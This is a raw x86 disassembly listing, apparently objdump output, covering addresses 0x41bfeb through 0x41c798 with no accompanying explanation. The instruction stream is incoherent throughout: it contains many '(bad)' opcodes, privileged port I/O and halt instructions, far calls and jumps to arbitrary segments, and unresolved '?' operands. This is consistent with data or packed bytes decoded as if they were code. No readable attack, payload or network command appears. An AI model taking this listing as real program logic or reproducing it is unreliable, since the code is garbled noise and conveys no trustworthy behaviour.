  41bfeb:	das    
  41bfec:	loopne 0x41c005
  41bfee:	pop    DWORD PTR [edi-0x7c]
  41bff1:	inc    edx
  41bff2:	and    al,0x93
  41bff4:	dec    ebp
  41bff5:	mov    ebx,0x89eb9a92
  41bffa:	inc    ecx
  41bffb:	mov    al,ds:0x7d5d81b0
  41c000:	mov    eax,DWORD PTR [ecx+0x1b4332ef]
  41c006:	jl     0x41c087
  41c008:	push   ebx
  41c009:	addr16 cld 
  41c00b:	test   al,0x47
  41c00d:	jne    0x41bfe2
  41c00f:	sub    BYTE PTR [esi],ch
  41c011:	dec    ebx
  41c012:	int    0xa7
  41c014:	cmp    bl,BYTE PTR [edi+0x486ab7cb]
  41c01a:	xchg   DWORD PTR [edx+0x3389dc71],edx
  41c020:	inc    ebx
  41c021:	shl    DWORD PTR [ebx],1
  41c023:	in     al,0xfa
  41c025:	sbb    edx,edi
  41c027:	push   ecx
  41c028:	xor    eax,0xfa5c3762
  41c02d:	cmp    bh,BYTE PTR [eax]
  41c02f:	mov    bh,0xf1
  41c031:	jno    0x41c02b
  41c033:	cmp    eax,0x8663f1f9
  41c038:	repz xchg esi,eax
  41c03a:	cdq    
  41c03b:	xor    ecx,DWORD PTR [esi-0x209f8e51]
  41c041:	pop    esi
  41c042:	(bad)  
  41c043:	sbb    al,0x93
  41c045:	or     DWORD PTR [ebp-0x5802ddcd],ecx
  41c04b:	shl    DWORD PTR [edx+0x7e4f4b43],1
  41c051:	ss jae 0x41c04f
  41c054:	dec    ebx
  41c055:	pop    ecx
  41c056:	sub    al,0xd0
  41c058:	sbb    eax,0x89570412
  41c05d:	push   ebp
  41c05e:	dec    edi
  41c05f:	int    0xe4
  41c061:	mov    ebp,0xc549d4bf
  41c066:	ins    BYTE PTR es:[edi],dx
  41c067:	pop    ds
  41c068:	add    al,0xc8
  41c06a:	add    eax,0xc56a386a
  41c06f:	ficom  DWORD PTR ds:[edx+edx*8]
  41c073:	nop
  41c074:	mov    ah,0x31
  41c076:	mov    esi,0x62119633
  41c07b:	(bad)  
  41c07c:	mov    edi,0x129c8b38
  41c081:	repnz (bad) 
  41c083:	imul   edx,DWORD PTR [ecx],0x61
  41c086:	push   esi
  41c087:	fdiv   QWORD PTR [edx-0x606f4557]
  41c08d:	xchg   edi,eax
  41c08e:	inc    ecx
  41c08f:	inc    ecx
  41c090:	adc    eax,0x55f631e
  41c095:	adc    cl,BYTE PTR [ebp+0x6a6064d1]
  41c09b:	mov    ebp,0xc4270606
  41c0a0:	or     BYTE PTR [esi+0x39],ch
  41c0a3:	ss push edx
  41c0a5:	(bad)  
  41c0a6:	xor    BYTE PTR [edi-0x6f],bl
  41c0a9:	es dec esp
  41c0ab:	push   eax
  41c0ac:	fld    DWORD PTR [edx+eax*8+0x368130e]
  41c0b3:	jns    0x41c071
  41c0b5:	out    dx,eax
  41c0b6:	int3   
  41c0b7:	test   BYTE PTR [edi-0x4c],ah
  41c0ba:	js     0x41c0de
  41c0bc:	mov    dh,0xfe
  41c0be:	mov    ecx,0x84591281
  41c0c3:	ds int3 
  41c0c5:	in     al,dx
  41c0c6:	cmp    BYTE PTR [edi+0x3f00340c],dl
  41c0cc:	cwde   
  41c0cd:	cld    
  41c0ce:	ror    DWORD PTR [ecx],1
  41c0d0:	not    BYTE PTR [eax+0x1c92054b]
  41c0d6:	test   al,0x59
  41c0d8:	int3   
  41c0d9:	mov    esp,0x18fa9bd
  41c0de:	icebp  
  41c0df:	cmp    dh,BYTE PTR ss:[edi-0x62ff2184]
  41c0e6:	xchg   ebx,eax
  41c0e7:	or     al,0x38
  41c0e9:	adc    al,0x28
  41c0eb:	add    BYTE PTR [ebp+eax*8+0x1d],bh
  41c0ef:	add    BYTE PTR [eax+0x61],0x1e
  41c0f3:	aaa    
  41c0f4:	je     0x41c08e
  41c0f6:	xchg   DWORD PTR [ebx-0x4b7e2c4c],eax
  41c0fc:	fsub   QWORD PTR [ebx]
  41c0fe:	dec    edi
  41c0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c100:	jnp    0x41c174
  41c102:	sahf   
  41c103:	rol    DWORD PTR ds:0xcfec75b6,0x26
  41c10a:	test   ch,ah
  41c10c:	cli    
  41c10d:	push   0xad673279
  41c112:	shl    ah,0xb8
  41c115:	xchg   edi,eax
  41c116:	dec    esi
  41c117:	adc    BYTE PTR [eax-0x77c81b85],bh
  41c11d:	or     al,0xfa
  41c120:	push   ebx
  41c121:	test   BYTE PTR [edi],dl
  41c123:	test   cl,0x9e
  41c126:	push   es
  41c127:	sti    
  41c128:	push   eax
  41c129:	push   esp
  41c12a:	adc    cl,BYTE PTR [ebp+0x30]
  41c12d:	sahf   
  41c12e:	arpl   WORD PTR ds:0x1b671ed3,ax
  41c134:	add    dh,BYTE PTR [esp+ebp*1]
  41c137:	push   edi
  41c138:	jns    0x41c135
  41c13a:	clc    
  41c13b:	xchg   ecx,eax
  41c13c:	lods   al,BYTE PTR ds:[esi]
  41c13d:	(bad)  
  41c13e:	cwde   
  41c13f:	cmp    ebp,esi
  41c141:	or     esp,DWORD PTR [ecx+0x1]
  41c144:	push   ebx
  41c145:	mov    WORD PTR [esi+0x74e82161],gs
  41c14b:	hlt    
  41c14c:	test   eax,0x901ea3e8
  41c151:	sbb    al,0x52
  41c153:	xor    eax,0xe319d199
  41c158:	add    cl,BYTE PTR [eax]
  41c15a:	repnz (bad) 
  41c15c:	mov    edi,0xa2c5c47b
  41c161:	pop    ecx
  41c162:	leave  
  41c163:	xchg   edx,eax
  41c164:	push   edi
  41c165:	addr16 jp 0x41c0f1
  41c168:	cdq    
  41c169:	inc    esp
  41c16a:	cs call 0x163d:0xa6ba3dd
  41c172:	mov    cl,0x78
  41c174:	pop    edx
  41c175:	sbb    dh,BYTE PTR [eax+ecx*8-0x73]
  41c179:	xchg   ebp,eax
  41c17a:	loopne 0x41c177
  41c17c:	mov    ds:0xf375a832,al
  41c181:	mov    eax,0x9da4ddab
  41c186:	xlat   BYTE PTR ds:[ebx]
  41c187:	mov    ?,ebp
  41c189:	push   0x39349ea7
  41c18e:	mov    dh,0xc8
  41c190:	mov    ebx,0x25eec6d2
  41c195:	xor    DWORD PTR [esi+0x68cfe67e],0x34
  41c19c:	out    dx,eax
  41c19d:	mov    al,cl
  41c19f:	xor    al,0xeb
  41c1a1:	out    dx,eax
  41c1a2:	in     eax,dx
  41c1a3:	(bad)  
  41c1a4:	in     eax,dx
  41c1a5:	and    eax,0x5d987f72
  41c1aa:	ret    
  41c1ab:	arpl   WORD PTR [edx-0x3e],cx
  41c1ae:	xchg   esp,eax
  41c1af:	cmp    eax,0xa0f55182
  41c1b4:	cmp    eax,DWORD PTR [edx+ecx*4]
  41c1b7:	cmp    ch,BYTE PTR [ebx-0x5c71b8b4]
  41c1bd:	daa    
  41c1be:	xchg   ebx,eax
  41c1bf:	inc    ebx
  41c1c0:	xchg   edi,eax
  41c1c1:	loopne 0x41c189
  41c1c3:	fdivr  st(5),st
  41c1c5:	push   es
  41c1c6:	mov    eax,ds:0x269a6ed7
  41c1cb:	imul   esi,DWORD PTR [edi+0x2c],0x2
  41c1cf:	mov    bl,0xdd
  41c1d1:	adc    DWORD PTR [ebx-0x4d0328ac],edx
  41c1d7:	sub    esi,DWORD PTR [ebp+0x19]
  41c1da:	out    dx,eax
  41c1db:	xchg   esp,eax
  41c1dc:	fistp  QWORD PTR [edi-0xd]
  41c1df:	int    0xa5
  41c1e1:	or     eax,0xe69087f0
  41c1e6:	mov    bh,0x34
  41c1e8:	add    DWORD PTR [ecx-0x5e],0xfffffff3
  41c1ec:	adc    DWORD PTR [ebx],edx
  41c1ee:	imul   edx,DWORD PTR [ebx+esi*2-0x24],0xcfffcc88
  41c1f6:	das    
  41c1f7:	sbb    DWORD PTR gs:[ecx],esi
  41c1fa:	rcr    ebp,1
  41c1fc:	push   eax
  41c1fd:	sbb    DWORD PTR [ebp-0x2965b7fd],eax
  41c203:	mov    bl,0xb2
  41c205:	bound  eax,QWORD PTR [esi-0x5a]
  41c208:	push   eax
  41c209:	adc    BYTE PTR [ecx+0x76d2907c],0x51
  41c210:	(bad)  
  41c211:	(bad)  
  41c212:	mov    DWORD PTR [esi-0x4e0f54e8],ebx
  41c218:	jnp    0x41c232
  41c21a:	ins    DWORD PTR es:[edi],dx
  41c21b:	cwde   
  41c21c:	mov    esp,0x82b67fa9
  41c221:	add    DWORD PTR [ecx],esi
  41c223:	fist   WORD PTR [esi]
  41c225:	in     eax,dx
  41c226:	fnstsw WORD PTR [eax]
  41c228:	je     0x41c25e
  41c22a:	cmp    eax,DWORD PTR [edi+0xd4a0dac]
  41c230:	pop    edi
  41c231:	push   ecx
  41c232:	(bad)
  41c235:	dec    esi
  41c236:	aaa    
  41c237:	cwde   
  41c238:	imul   esp,DWORD PTR [esp+edi*4+0xa6d5e37],0x38
  41c240:	out    dx,eax
  41c241:	mov    edx,ss
  41c243:	mov    ebx,fs
  41c245:	pop    esp
  41c246:	bound  eax,QWORD PTR [esi+ebx*4-0x3ce650b5]
  41c24d:	stc    
  41c24e:	pop    esp
  41c24f:	ds jmp 0x41c225
  41c252:	pop    ss
  41c253:	ins    DWORD PTR es:[edi],dx
  41c254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c255:	or     DWORD PTR [ecx-0x46],ebp
  41c258:	neg    al
  41c25a:	in     al,dx
  41c25b:	sbb    dh,al
  41c25d:	or     DWORD PTR [ecx+0x5d],eax
  41c260:	jp     0x41c278
  41c262:	lds    ebp,FWORD PTR [eax]
  41c264:	cs pushw ds
  41c267:	pop    ebx
  41c268:	das    
  41c269:	stc    
  41c26a:	ds push esp
  41c26c:	pop    ecx
  41c26d:	lods   eax,DWORD PTR ds:[esi]
  41c26e:	cmp    esp,ebp
  41c270:	mov    bh,0xf3
  41c272:	adc    ch,0xd3
  41c275:	sub    DWORD PTR [ebx],ebp
  41c277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c278:	and    DWORD PTR [ebx+0x27c1da16],edi
  41c27e:	addr16 pop edi
  41c280:	jp     0x41c235
  41c282:	int    0x2d
  41c284:	adc    DWORD PTR [esi+0xa],ebp
  41c287:	(bad)  
  41c288:	xchg   ecx,eax
  41c289:	sbb    DWORD PTR [eax-0x64],edx
  41c28c:	push   ebp
  41c28d:	jno    0x41c280
  41c28f:	lods   al,BYTE PTR ds:[esi]
  41c290:	(bad)  
  41c291:	cmp    al,0xdc
  41c293:	sub    ah,ch
  41c295:	out    dx,eax
  41c296:	pop    esi
  41c297:	jbe    0x41c260
  41c299:	xchg   ebx,eax
  41c29a:	and    dl,bh
  41c29c:	inc    esi
  41c29d:	sub    DWORD PTR [ebx],edx
  41c29f:	mov    ah,0x31
  41c2a1:	xchg   DWORD PTR [ebx+eax*2],eax
  41c2a4:	jecxz  0x41c31e
  41c2a6:	cmp    ah,bl
  41c2a8:	aam    0x1f
  41c2aa:	mov    edx,0xcd39d00f
  41c2af:	js     0x41c2ed
  41c2b1:	mov    ebp,0xbd7ddb55
  41c2b6:	add    edx,DWORD PTR ds:0x1788259c
  41c2bc:	mov    eax,0x5be9bc18
  41c2c1:	and    ecx,esp
  41c2c3:	mov    eax,0xd8c66152
  41c2c8:	retf   0x3a31
  41c2cb:	mov    dl,0x20
  41c2cd:	push   0x25
  41c2cf:	sbb    eax,0x541a1bd4
  41c2d4:	jecxz  0x41c266
  41c2d6:	and    bl,BYTE PTR [ecx+0x4a]
  41c2d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2da:	(bad)  
  41c2dc:	inc    ebx
  41c2dd:	ss mov dl,0xa
  41c2e0:	rcr    BYTE PTR [eax+eax*4-0x42e19eb2],1
  41c2e7:	outs   dx,BYTE PTR ds:[esi]
  41c2e8:	ret    0x9608
  41c2eb:	sbb    DWORD PTR [ebx-0x61dce95d],edx
  41c2f1:	adc    eax,0x4ced28d6
  41c2f6:	push   ebx
  41c2f7:	and    edi,edx
  41c2f9:	repz mov al,BYTE PTR [eax+0x4898fc2d]
  41c300:	cmp    BYTE PTR [edi-0x61ae55b0],bl
  41c306:	cmp    BYTE PTR [edi-0x74],dh
  41c309:	mov    cl,dl
  41c30b:	pop    ebx
  41c30c:	adc    ebp,eax
  41c30e:	cld    
  41c30f:	rol    DWORD PTR [edx+edi*8],cl
  41c312:	jbe    0x41c38b
  41c314:	cld    
  41c315:	cmc    
  41c316:	and    ecx,DWORD PTR [ebx]
  41c318:	dec    edi
  41c319:	retf   
  41c31a:	cmp    ebx,DWORD PTR [edi-0x31]
  41c31d:	retf   0xdb8c
  41c320:	imul   ebx,DWORD PTR [edi-0x64a071cb],0xd5d1b6a4
  41c32a:	jb     0x41c325
  41c32c:	xchg   BYTE PTR [edx-0x6b001cb1],ch
  41c332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c333:	mov    al,ds:0xb3071273
  41c338:	dec    ebp
  41c339:	fnstsw WORD PTR [ebx-0x4590f047]
  41c33f:	sbb    al,0x7f
  41c341:	inc    edx
  41c342:	retf   
  41c343:	shl    DWORD PTR [eax-0x2886360c],cl
  41c349:	cmp    DWORD PTR [edx],0x7a
  41c34c:	push   es
  41c34d:	call   DWORD PTR [ecx+0x7d]
  41c350:	push   ds
  41c351:	div    DWORD PTR [edx+ecx*2]
  41c354:	sub    eax,0x84b509ef
  41c359:	push   ebp
  41c35a:	cmp    ah,BYTE PTR [eax]
  41c35c:	div    DWORD PTR [esi]
  41c35e:	push   si
  41c360:	pop    edx
  41c361:	push   ss
  41c362:	mov    ch,0x78
  41c364:	or     DWORD PTR [edi+0x64],0xffffff9a
  41c368:	mov    ds:0x2adb8741,al
  41c36d:	add    ebp,ebp
  41c36f:	arpl   WORD PTR ds:0x5cb7a362,bp
  41c375:	inc    esi
  41c376:	sub    DWORD PTR [ebx+0x2c],eax
  41c379:	repz adc DWORD PTR [eax+0x15],edi
  41c37d:	add    cl,BYTE PTR [ebx+0x1d]
  41c380:	push   0x353875c8
  41c385:	xchg   DWORD PTR ds:0xc3b51cb6,esi
  41c38b:	push   ebx
  41c38c:	pop    ebx
  41c38d:	das    
  41c38e:	aas    
  41c38f:	stc    
  41c390:	loopne 0x41c35a
  41c392:	add    esp,edi
  41c394:	xor    DWORD PTR [edx+ebx*4],ebx
  41c397:	aaa    
  41c398:	jmp    0xbf6fe6fa
  41c39d:	out    0x31,eax
  41c39f:	pusha  
  41c3a0:	or     eax,edi
  41c3a2:	xor    BYTE PTR [ebx-0x5f4c5f67],0x2
  41c3a9:	sbb    eax,0x7a98eef0
  41c3ae:	popa   
  41c3af:	push   esp
  41c3b0:	jae    0x41c412
  41c3b2:	inc    edi
  41c3b3:	out    0x78,eax
  41c3b5:	mov    eax,ds:0x98ee5cd5
  41c3ba:	out    0x72,al
  41c3bc:	jns    0x41c3a2
  41c3be:	push   ss
  41c3bf:	push   edi
  41c3c0:	test   BYTE PTR [edi+eax*4+0x9f333],bh
  41c3c7:	shl    DWORD PTR [edx],cl
  41c3c9:	dec    esi
  41c3ca:	(bad)
  41c3ce:	loop   0x41c3d3
  41c3d0:	int3   
  41c3d1:	mov    ch,ch
  41c3d3:	repz in al,0xf0
  41c3d6:	adc    eax,DWORD PTR [edi+0x2a]
  41c3d9:	js     0x41c42c
  41c3db:	push   esp
  41c3dc:	gs inc ebp
  41c3de:	scas   eax,DWORD PTR es:[edi]
  41c3df:	dec    edx
  41c3e0:	pop    ds
  41c3e1:	adc    eax,0x3f377380
  41c3e6:	dec    edx
  41c3e7:	jle    0x41c406
  41c3e9:	fnstcw WORD PTR [esi+0x37c64ee3]
  41c3ef:	add    ebp,esi
  41c3f1:	push   ds
  41c3f2:	sbb    DWORD PTR [edx-0x20d70750],ebx
  41c3f8:	push   cs
  41c3f9:	xor    eax,DWORD PTR [eax+ecx*8]
  41c3fc:	xlat   BYTE PTR ds:[ebx]
  41c3fd:	rcl    DWORD PTR [edx+eiz*2-0x54],1
  41c401:	inc    ebx
  41c402:	mov    bh,0xfa
  41c404:	aad    0x48
  41c406:	shr    DWORD PTR [ecx+eax*1-0x409d79ae],1
  41c40d:	retf   
  41c40e:	fs mov edi,0x5f493c79
  41c414:	fiadd  DWORD PTR ds:0x46a4c15e
  41c41a:	mov    cs,WORD PTR [ecx-0x6e35eda]
  41c420:	addr16 jb 0x41c41b
  41c423:	out    0x27,al
  41c425:	or     ch,BYTE PTR [eax+0x34]
  41c428:	push   ebp
  41c429:	pop    ebp
  41c42a:	in     eax,0xff
  41c42c:	cmp    DWORD PTR [edx-0x4520c365],esi
  41c432:	lahf   
  41c433:	mov    ah,0x95
  41c435:	daa    
  41c436:	cmp    edx,DWORD PTR [edx]
  41c438:	push   ecx
  41c439:	jg     0x41c40d
  41c43b:	inc    ebp
  41c43c:	bound  esi,QWORD PTR [edi-0xabe335]
  41c442:	pop    ecx
  41c443:	cwde   
  41c444:	jo     0x41c3ff
  41c446:	jbe    0x41c439
  41c448:	pop    ebx
  41c449:	xor    esp,DWORD PTR [edi+0x55]
  41c44c:	ss pop ebx
  41c44e:	and    BYTE PTR [edx+ecx*1-0x3c45ddc9],dh
  41c455:	mov    ah,0x67
  41c457:	and    DWORD PTR [edx+0x3afaec8f],ecx
  41c45d:	sahf   
  41c45e:	js     0x41c4cf
  41c460:	sub    cl,cl
  41c462:	jns    0x41c4cb
  41c464:	aaa    
  41c465:	xor    dl,al
  41c467:	add    al,0xe2
  41c469:	cmp    DWORD PTR [eax],edx
  41c46b:	sub    BYTE PTR [esi],bl
  41c46d:	jecxz  0x41c48f
  41c46f:	iret   
  41c470:	dec    ecx
  41c471:	lea    edx,[edi-0x5d]
  41c474:	bound  ebp,QWORD PTR [eax+0x34b0b36f]
  41c47a:	ret    
  41c47b:	mov    bl,0xff
  41c47d:	into   
  41c47e:	enter  0x2f60,0xa1
  41c482:	sub    ecx,DWORD PTR [ebx+edi*2+0x41852b85]
  41c489:	jb     0x41c502
  41c48b:	mov    bl,0x3b
  41c48d:	mov    BYTE PTR [ebp+esi*1-0x5d4c587c],ch
  41c494:	push   ss
  41c495:	push   cs
  41c496:	shr    BYTE PTR [eax-0x366c19e],cl
  41c49c:	xchg   ah,bl
  41c49e:	test   DWORD PTR [eax+0x39],ecx
  41c4a1:	dec    edi
  41c4a2:	lods   al,BYTE PTR ds:[esi]
  41c4a3:	cmp    ecx,DWORD PTR [eax+0x6f]
  41c4a6:	(bad)  
  41c4a7:	mov    edx,0x7377d78d
  41c4ac:	mov    ch,0xc0
  41c4ae:	xchg   DWORD PTR [eax],ecx
  41c4b0:	stos   DWORD PTR es:[edi],eax
  41c4b1:	adc    al,BYTE PTR [esi]
  41c4b3:	cld    
  41c4b4:	fidivr DWORD PTR [esi]
  41c4b6:	fdiv   st(4),st
  41c4b8:	int    0xcf
  41c4ba:	and    DWORD PTR [ebx-0x777b8aa6],edx
  41c4c0:	xchg   DWORD PTR [ebp-0x3],eax
  41c4c3:	fnstenv [ebx]
  41c4c5:	lods   al,BYTE PTR gs:[esi]
  41c4c7:	push   edi
  41c4c8:	and    eax,0xdfb97c5c
  41c4cd:	mov    ds:0xd1fe1620,eax
  41c4d2:	je     0x41c539
  41c4d4:	in     eax,0x3d
  41c4d6:	jge    0x41c545
  41c4d8:	mov    esp,0xc436bca8
  41c4dd:	int    0x65
  41c4df:	ins    BYTE PTR es:[edi],dx
  41c4e0:	sbb    bh,BYTE PTR [edx+0x6ee8c843]
  41c4e6:	(bad)  
  41c4e7:	adc    bl,BYTE PTR [ecx+0x46ad8]
  41c4ed:	push   ds
  41c4ee:	scas   eax,DWORD PTR es:[edi]
  41c4ef:	mov    eax,0x62ca6481
  41c4f4:	ret    0xb120
  41c4f7:	push   ds
  41c4f8:	loopne 0x41c497
  41c4fa:	jns    0x41c4f4
  41c4fc:	mov    eax,ds:0xe21fdc1e
  41c501:	push   esp
  41c502:	mov    eax,0xc4ed1e16
  41c507:	fdiv   DWORD PTR [ebp-0x5feb90e1]
  41c50d:	cs pop esp
  41c50f:	fild   DWORD PTR [edx]
  41c511:	xor    eax,0x2bb7768c
  41c516:	add    esi,0xffffffbd
  41c519:	jg     0x41c523
  41c51b:	ret    
  41c51c:	neg    dh
  41c51e:	ds icebp 
  41c520:	xor    bl,0xc8
  41c523:	mov    BYTE PTR [edi],ah
  41c525:	rol    edi,1
  41c527:	hlt    
  41c528:	pop    ebx
  41c529:	adc    eax,0x1670f604
  41c52e:	pop    es
  41c52f:	mov    cl,0x77
  41c531:	sbb    eax,0xf84178a2
  41c536:	mov    dh,0x1
  41c538:	sbb    eax,0x268f1992
  41c53d:	outs   dx,DWORD PTR ds:[esi]
  41c53e:	pop    ebp
  41c53f:	push   0x6d
  41c541:	jmp    0xb8c7:0x1e99812f
  41c548:	test   al,0x9c
  41c54a:	int    0xc2
  41c54c:	jg     0x41c5bf
  41c54e:	lods   eax,DWORD PTR ds:[esi]
  41c54f:	shl    BYTE PTR [esp+ebx*1-0x13],0x9d
  41c554:	fisubr WORD PTR [ecx+0x52ebfc06]
  41c55a:	adc    esp,DWORD PTR [ebx+eiz*1+0x45d26927]
  41c561:	push   cs
  41c562:	imul   edx,edx,0x609c842f
  41c568:	call   0xb08c:0xe67c9a31
  41c56f:	wbinvd 
  41c571:	scas   eax,DWORD PTR es:[edi]
  41c572:	jne    0x41c543
  41c574:	sub    eax,0xc79e6514
  41c579:	xchg   ebx,eax
  41c57a:	add    DWORD PTR [esi+0x65],esi
  41c57d:	std    
  41c57e:	inc    DWORD PTR [esi]
  41c580:	aas    
  41c581:	in     eax,0x94
  41c583:	das    
  41c584:	and    edi,DWORD PTR [edi+ecx*8+0x7f31f368]
  41c58b:	push   ebx
  41c58c:	jnp    0x41c5ca
  41c58e:	sub    ah,BYTE PTR [edx-0x3e]
  41c591:	jns    0x41c54a
  41c593:	mov    ch,bh
  41c595:	mov    ds:0xfc0e1e1b,eax
  41c59a:	sar    DWORD PTR [eax+ecx*2],cl
  41c59d:	inc    eax
  41c59e:	stos   DWORD PTR es:[edi],eax
  41c59f:	push   esp
  41c5a0:	cmp    BYTE PTR ds:0x2f20296,ah
  41c5a6:	mov    WORD PTR ds:0xa89bac0f,?
  41c5ac:	je     0x41c5a7
  41c5ae:	aam    0x85
  41c5b0:	daa    
  41c5b1:	test   ebx,0x865b83c6
  41c5b7:	arpl   WORD PTR [edi-0x10],bp
  41c5ba:	push   edx
  41c5bb:	std    
  41c5bc:	inc    edx
  41c5bd:	xor    ah,BYTE PTR [edi-0x69]
  41c5c0:	shl    DWORD PTR [edi-0x48],cl
  41c5c3:	pop    ebp
  41c5c4:	add    BYTE PTR [edi+eiz*4-0x5e],0x15
  41c5c9:	ins    DWORD PTR es:[edi],dx
  41c5ca:	enter  0x68ce,0x79
  41c5ce:	nop
  41c5cf:	pop    DWORD PTR [ecx+ecx*4]
  41c5d2:	dec    edi
  41c5d3:	fmul   st,st(4)
  41c5d5:	dec    ebx
  41c5d6:	loope  0x41c602
  41c5d8:	mov    bh,0x29
  41c5da:	sbb    eax,DWORD PTR [esi-0x6db926bc]
  41c5e0:	mov    esp,0xfd0a7b4b
  41c5e5:	daa    
  41c5e6:	das    
  41c5e7:	scas   eax,DWORD PTR es:[edi]
  41c5e8:	(bad)  
  41c5e9:	mov    dh,BYTE PTR [edx]
  41c5eb:	add    ecx,DWORD PTR [eax]
  41c5ed:	inc    esi
  41c5ee:	xchg   DWORD PTR [esi+0x41b0e9c7],esi
  41c5f4:	imul   ebx,DWORD PTR [edi-0x28],0x261c360f
  41c5fb:	gs scas al,BYTE PTR es:[edi]
  41c5fd:	test   eax,0xf5accf4b
  41c602:	int3   
  41c603:	cmc    
  41c604:	add    esi,eax
  41c606:	inc    edi
  41c607:	js     0x41c663
  41c609:	outs   dx,BYTE PTR ds:[esi]
  41c60a:	and    al,0x71
  41c60c:	lea    edi,[ebx-0x10]
  41c60f:	cmp    DWORD PTR [eax-0x51da5402],ebp
  41c615:	jmp    FWORD PTR [edx-0x4bb5121c]
  41c61b:	jo     0x41c601
  41c61d:	in     al,dx
  41c61e:	or     DWORD PTR [edi+0x59],ecx
  41c621:	cs jecxz 0x41c5af
  41c624:	xor    eax,0x2e23385c
  41c629:	xchg   al,bl
  41c62b:	ror    BYTE PTR [eax+0x21b3cc02],cl
  41c631:	test   eax,0xea11f7fc
  41c636:	xor    BYTE PTR [ecx+ebx*8-0x58],cl
  41c63a:	mov    al,0x83
  41c63c:	or     DWORD PTR [ecx-0x22],edi
  41c63f:	cmovbe ebx,DWORD PTR [edx]
  41c642:	cmp    DWORD PTR [edi],edx
  41c644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c645:	fwait
  41c646:	cwde   
  41c647:	and    al,0xdf
  41c649:	test   BYTE PTR [ecx-0x23],bl
  41c64c:	adc    BYTE PTR [ebp+esi*4+0x641d1043],0x21
  41c654:	mov    ah,bl
  41c656:	mov    edx,0xe0186a6a
  41c65b:	inc    edi
  41c65c:	sbb    DWORD PTR [edx],0x21
  41c65f:	or     ebp,eax
  41c661:	fdiv   QWORD PTR [edx-0x74]
  41c664:	xor    ebx,DWORD PTR [ecx-0x66]
  41c667:	jo     0x41c68f
  41c669:	mov    eax,ds:0xcdf5bbc1
  41c66e:	mov    bh,BYTE PTR [edi]
  41c670:	dec    esp
  41c671:	xchg   esp,eax
  41c672:	(bad)  
  41c673:	or     eax,0x792861e8
  41c678:	mov    ds:0xb28ca453,al
  41c67d:	scas   al,BYTE PTR es:[edi]
  41c67e:	sub    DWORD PTR ds:0xc2cdee3c,esi
  41c684:	xor    ebx,edi
  41c686:	fxch   st(1)
  41c688:	mov    edx,0x8bd3e578
  41c68d:	dec    edi
  41c68e:	js     0x41c664
  41c690:	int3   
  41c691:	shl    ecx,1
  41c693:	sbb    eax,DWORD PTR [ecx+edx*2-0x20]
  41c697:	leave  
  41c698:	mov    ebx,0x82cdf10e
  41c69d:	xchg   DWORD PTR [ebx-0x1673296c],ecx
  41c6a3:	retf   0x663e
  41c6a6:	(bad)  
  41c6a7:	or     ch,ah
  41c6a9:	cmp    ebx,DWORD PTR [eax-0x1b392ebe]
  41c6af:	sub    edi,edx
  41c6b1:	sahf   
  41c6b2:	sub    DWORD PTR [edx-0x49],ecx
  41c6b5:	js     0x41c722
  41c6b7:	and    BYTE PTR [edx-0x32359de6],dh
  41c6bd:	loop   0x41c6cd
  41c6bf:	inc    ecx
  41c6c0:	mov    al,BYTE PTR [eax+0x3d]
  41c6c3:	sti    
  41c6c4:	iret   
  41c6c5:	repnz inc esp
  41c6c7:	add    eax,0x76ae56e6
  41c6cc:	push   cs
  41c6cd:	call   0x736:0xa1adccda
  41c6d4:	mov    edx,0x8e02c06a
  41c6d9:	inc    ebx
  41c6da:	ss icebp 
  41c6dc:	scas   al,BYTE PTR es:[edi]
  41c6dd:	or     edx,esi
  41c6df:	loopne 0x41c69f
  41c6e1:	mov    BYTE PTR fs:[edx+eiz*8+0x64bebce0],0x87
  41c6ea:	push   cs
  41c6eb:	jbe    0x41c6bb
  41c6ed:	shl    cl,0xa1
  41c6f0:	cli    
  41c6f1:	repnz sti 
  41c6f3:	sar    DWORD PTR [esp+ebp*4],cl
  41c6f6:	dec    edx
  41c6f7:	mov    eax,0xb616a0b3
  41c6fc:	or     eax,0x21148126
  41c701:	ins    BYTE PTR es:[edi],dx
  41c702:	inc    ecx
  41c703:	mov    edi,0x30105e10
  41c708:	lock cli 
  41c70a:	rcr    DWORD PTR [eax+0x695feb09],1
  41c710:	sbb    ebx,DWORD PTR [ebx]
  41c712:	sbb    bh,ch
  41c714:	mov    ecx,0x97ea86e7
  41c719:	fsubp  st(5),st
  41c71b:	mov    cs,WORD PTR [ecx+edi*1+0x6]
  41c71f:	xor    bl,BYTE PTR [edx-0x13]
  41c722:	in     eax,dx
  41c723:	adc    ebp,DWORD PTR [ebp+0x75]
  41c726:	test   BYTE PTR [edi+0x5b],0x89
  41c72a:	loope  0x41c733
  41c72c:	scas   eax,DWORD PTR es:[edi]
  41c72d:	mov    ds:0x8f35ee3d,eax
  41c732:	adc    al,0xd1
  41c734:	scas   eax,DWORD PTR es:[edi]
  41c735:	pop    eax
  41c736:	mov    ds:0xab070644,al
  41c73b:	mov    esi,DWORD PTR [eax+0x5c]
  41c73e:	sbb    DWORD PTR [ebx],ebx
  41c740:	(bad)  
  41c741:	outs   dx,BYTE PTR ds:[esi]
  41c742:	es mov dh,0x28
  41c745:	mov    cl,0xdc
  41c747:	mov    eax,DWORD PTR [edx+0x4600c3bc]
  41c74d:	sub    bh,BYTE PTR [esi-0x692b51bf]
  41c753:	fxch   st(0)
  41c755:	ss inc edi
  41c757:	imul   edi,esp,0xffffff85
  41c75a:	aaa    
  41c75b:	cmp    eax,0x40ebff53
  41c760:	pop    ecx
  41c761:	or     bh,BYTE PTR [ebp+0x30bae0e2]
  41c767:	cmc    
  41c768:	in     al,0xe8
  41c76a:	sbb    al,0xad
  41c76c:	mov    WORD PTR [esi],?
  41c76e:	std    
  41c76f:	add    cl,0x45
  41c772:	xchg   ebx,eax
  41c773:	test   DWORD PTR [edx+0x3aa8148d],esi
  41c779:	cwde   
  41c77a:	aam    0x5f
  41c77c:	call   0x1eb15b06
  41c781:	ds (bad) 
  41c783:	adc    ah,al
  41c785:	sbb    al,0xa1
  41c787:	dec    DWORD PTR [esi+0x64]
  41c78a:	outs   dx,DWORD PTR ds:[esi]
  41c78b:	hlt    
  41c78c:	popf   
  41c78d:	stc    
  41c78e:	mov    DWORD PTR [esi-0x60],ebp
  41c791:	arpl   WORD PTR [esi-0x6d306eeb],bp
  41c797:	push   cs
  41c798:	add    ah,bl
